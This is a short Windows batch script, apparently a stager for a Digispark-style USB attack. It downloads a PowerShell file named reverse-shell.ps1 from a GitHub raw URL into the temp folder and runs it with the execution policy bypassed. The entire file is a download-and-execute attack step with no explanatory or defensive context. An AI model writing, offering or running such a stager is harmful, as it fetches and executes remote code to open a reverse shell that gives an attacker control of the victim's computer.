@echo off
set url=https://raw.githubusercontent.com/leightonisrael/digispark-play/main/reverse-shell.ps1
set path=%temp%\reverse_shell.ps1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%path%'"
powershell -NoProfile -ExecutionPolicy Bypass -File "%path%"
